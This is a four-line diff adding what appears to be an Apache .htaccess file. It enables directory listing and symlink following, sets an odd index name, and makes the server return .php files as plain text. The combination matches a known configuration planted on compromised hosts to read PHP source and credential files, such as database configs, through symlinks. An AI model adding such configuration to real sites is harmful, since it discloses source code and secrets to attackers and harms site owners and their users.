@@ -1,0 +1,4 @@
+Options Indexes FollowSymLinks
+DirectoryIndex 25>23.html
+AddType txt .php
+AddHandler txt .php
